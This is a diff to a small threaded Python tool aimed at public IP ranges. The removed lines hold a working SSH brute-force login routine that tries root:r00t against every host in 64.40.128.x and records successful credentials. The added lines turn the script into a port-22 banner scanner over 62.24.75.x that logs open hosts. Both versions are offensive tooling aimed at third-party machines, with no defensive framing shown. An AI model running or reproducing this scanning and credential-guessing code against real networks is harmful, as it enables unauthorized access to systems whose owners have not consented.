@@ -2,13 +2,12 @@
 # -*- coding: utf-8 -*-
 
 import socket
-import paramiko
 import threading
 
 
 # Saving valid resources in the file
 def save_data(data):
-    with open("valid.txt", "a") as f:
+    with open("ssh.txt", "a") as f:
         f.write(data)
 
 
@@ -33,12 +32,9 @@ def generate_hosts(start_ip, end_ip):
 
 # Running check to open port and start threads
 class Worker(threading.Thread):
-    def __init__(self, ip, port, username, password):
+    def __init__(self, ip):
         threading.Thread.__init__(self)
         self.ip = ip
-        self.port = port
-        self.username = username
-        self.password = password
 
     def run(self):
         self.check()
@@ -47,30 +43,18 @@ class Worker(threading.Thread):
         try:
             cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             cli.settimeout(5)
-            cli.connect((self.ip, self.port))
-            # banner = cli.recv(1024)
-            # print("[INFO] %s\t%s"% (self.ip, banner))
-            self.login()
+            cli.connect((self.ip, 22))
+            banner = cli.recv(1024)
+            print("[INFO] %s\t%s"% (self.ip, banner))
+            save_data(self.ip+"\n")
         except Exception as e:
-            pass
-            # print("[ERROR] %s\t%s"% (self.ip, e))
-
-    def login(self):
-        try:
-            ssh_cli = paramiko.SSHClient()
-            ssh_cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh_cli.connect(self.ip, port=self.port, username=self.username, password=self.password)
-            save_data("%s:%s:%s\n"% (self.ip, self.username, self.password))
-            ssh_cli.close()
-        except Exception:
-            print("[ERROR] Login failure to %s"% self.ip)
-
+            print("[ERROR] %s\t%s"% (self.ip, e))
 
 
 def main():
-    ip_range = generate_hosts("64.40.128.1", "64.40.128.254")
+    ip_range = generate_hosts("62.24.75.1", "62.24.75.254")
     for ip in ip_range:
-        bot = Worker(ip, 22, "root", "r00t")
+        bot = Worker(ip)
         bot.start()
 
 
